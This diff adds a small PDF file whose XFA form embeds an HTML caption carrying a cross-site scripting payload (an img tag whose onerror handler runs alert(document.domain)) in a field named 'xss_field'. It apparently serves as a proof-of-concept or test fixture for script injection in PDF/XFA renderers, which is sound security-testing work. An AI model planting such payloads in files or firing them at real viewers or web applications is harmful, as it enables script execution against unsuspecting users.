@@ -1,0 +1,32 @@
+%PDF-1.7
+1 0 obj << /Type /Catalog /Pages 2 0 R /AcroForm << /XFA 3 0 R >> >> endobj
+2 0 obj << /Type /Pages /Kids [4 0 R] /Count 1 >> endobj
+3 0 obj << /Length 609 >> stream
+<?xml version="1.0" encoding="UTF-8"?>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">
+    <subform name="form1" layout="tb">
+      <field name="xss_field">
+        <ui>
+          <textEdit/>
+        </ui>
+        <caption>
+          <value>
+            <exData contentType="text/html">
+              <body xmlns="http://www.w3.org/1999/xhtml">
+                <img src="x" onerror="alert(document.domain)"/>
+              </body>
+            </exData>
+          </value>
+        </caption>
+      </field>
+    </subform>
+  </template>
+</xdp:xdp>
+endstream endobj
+4 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> /Contents 5 0 R >> endobj
+5 0 obj << /Length 1 >> stream
+ 
+endstream endobj
+trailer << /Root 1 0 R /Size 6 >>
+%%EOF
